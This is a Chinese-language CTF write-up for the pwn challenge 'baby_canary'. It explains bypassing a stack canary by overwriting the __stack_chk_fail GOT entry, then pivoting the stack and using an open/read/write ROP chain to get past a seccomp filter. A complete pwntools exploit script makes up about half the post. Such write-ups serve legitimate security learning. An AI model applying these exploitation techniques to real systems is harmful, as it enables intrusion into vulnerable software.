---
layout: post
title: "baby_canary"
date: 2026-10-07 20:05:00 +0800
tags: ["CTF", "Write-up"]
description: "Notes and solution for baby_canary from sh (2026)."
source_folder: "Write-ups/2026/sh/baby_canary"
lang: zh-CN
---
{% raw %}
# 信息
```
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled

line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008
 0005: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0008
 0006: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x06 0x00 0x00 0x00000000  return KILL
```

# 反编译
## `gift()`

```
unsigned __int64 sub_4013CE()
{
  char v1; // [rsp+3h] [rbp-1Dh]
  int len; // [rsp+4h] [rbp-1Ch]
  int idx; // [rsp+8h] [rbp-18h]
  char buf[10]; // [rsp+Eh] [rbp-12h] BYREF
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  if ( dword_404068 )
  {
    dword_404068 = 0;
    while ( 1 )
    {
      while ( 1 )
      {
        len = read(0, buf, 9u);
        if ( !len )
        {
          puts("read error");
          exit(1);
        }
        buf[len] = 0;
        idx = atoi(buf);
        if ( idx <= 45 )
          break;
        puts("invalid index");
      }
      read(0, (char *)&unk_4040C0 + 8 * idx, 8u);
      puts("want to read more?");
      v1 = getchar();
      if ( v1 == 110 )
        break;
      if ( v1 != 121 )
      {
        puts("invalid choice");
        exit(1);
      }
      getchar();
    }
  }
  return v5 - __readfsqword(0x28u);
}
```

gift函数中在程序开始后，给了一个任意地址写，原程序没开pie，且前面没有可以利用的逻辑，说明这里要利用只能从程序段下手。

## `vnlu()`

```
unsigned __int64 vuln()
{
  _BYTE buf[24]; // [rsp+0h] [rbp-20h] BYREF
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("ok,try to hack me");
  read(0, buf, 0x30u);
  return v2 - __readfsqword(0x28u);
}
```
vnlu函数中给了0x18 bytes的溢出，非常有限，考虑栈迁移。
# 思路

整合一下条件，一次任意地址写，一次限制较大的溢出，且无canary。

所以需要通过一次写去，绕过canary的检测。回想一下，canary的检测与crash形式：
```
mov     rax, [rbp+var_8]
sub     rax, fs:28h
jz      short locret_401549
call    ___stack_chk_fail
```
通过rbp去寻找canary，与fs段寄存器保存的比较，不同则调用`___stack_chk_fail`函数，进行crash。

所以可以直接用任意地址写覆盖got表中的`___stack_chk_fail`函数，为ret地址（call会压返回地址，这里压栈的返回地址就是jz跳转的地址，其内容为`leave;ret`），绕过canary的检测。

之后就是常规的栈迁移，对于沙箱绕过，这里可以用orw或直接用`execveat`去getshell。

# exp

```
from pwncli import *
import sys

context(arch="amd64", os="linux", endian="little")
context.terminal = ["tilix", "--action=session-add-right", "-e"]

file = "/home/qwer/pwn/pwn"
host = "node5.buuoj.cn"
port = 25707
p = ELF(file)
libc = ELF("./libc.so.6")

if "r" in sys.argv:
    io = remote(host, port)
    log.success("运行模式: 远程 (Remote)")
else:
    io = process(file)
    log.success("运行模式: 本地 (Local)")

if "d" in sys.argv:
    context.log_level = "debug"
    log.success("Debug: 开启 (Debug On)")


def dbg(cmd=""):
    if "r" in sys.argv or "na" in sys.argv:
        log.success("pwndbg连接关闭 (Pwndbg Disabled)")
        return
    else:
        gdb.attach(io, gdbscript=cmd)
        log.success("pwndbg已连接 (Pwndbg Attached)")
        pause()


s = lambda data: io.send(data)
sl = lambda data: io.sendline(data)
sa = lambda x, data: io.sendafter(x, data)
sla = lambda x, data: io.sendlineafter(x, data)
r = lambda num=4096: io.recv(num)
rn = lambda num: io.recvn(num)
rl = lambda num=4096: io.recvline(num)
ru = lambda x, drop=False: io.recvuntil(x, drop=drop)
uu32 = lambda data: u32(data.ljust(4, b"\x00"))
uu64 = lambda data: u64(data.ljust(8, b"\x00"))
n2ds = lambda data: str(data).encode()


def look(expr):
    frame_globals = globals()
    value = eval(expr, frame_globals)
    print(f"\033[ x ]  [1;94m{expr} -> {hex(value)}\033[0m")
    return value


bss = p.bss(0x800)

ru(b"canary!\n")

s(n2ds((0x404020 - 0x4040C0) // 8).ljust(9, b"\x00"))
s(p64(0x401594))
sa(b"more?\n", b"n")
ru(b"hack me\n")
s(b"A" * 0x20 + p64(bss) + p64(0x40151E))

payload = flat(
    bss + 0x18,
    0x4013C9,  # pop rax; ret
    p.got["puts"],
    0x401516,
    bss - 0x20,
    0x401549,  # leave; ret
)
s(payload)

libc.address = uu64(r(6)) - libc.sym["puts"]
look("libc.address")

pop_rdx_r12_ret = libc.address + 0x11F357
pop_rdi_ret = libc.address + 0x02A3E5
pop_rsi_ret = libc.address + 0x02BE51
payload = flat(pop_rdx_r12_ret, 0x1000, 0, 0x40152A, 0, 0)
s(payload)

payload = flat(
    "./flag".ljust(8, "\x00"),
    0,
    0,
    pop_rdi_ret,
    0x404878,
    pop_rsi_ret,
    0,
    libc.sym["open"],
    pop_rdi_ret,
    3,
    pop_rsi_ret,
    bss - 0x500,
    pop_rdx_r12_ret,
    0x50,
    0,
    libc.sym["read"],
    pop_rdi_ret,
    1,
    pop_rsi_ret,
    bss - 0x500,
    pop_rdx_r12_ret,
    0x50,
    0,
    libc.sym["write"],
)
s(payload)

io.interactive()
```


{% endraw %}
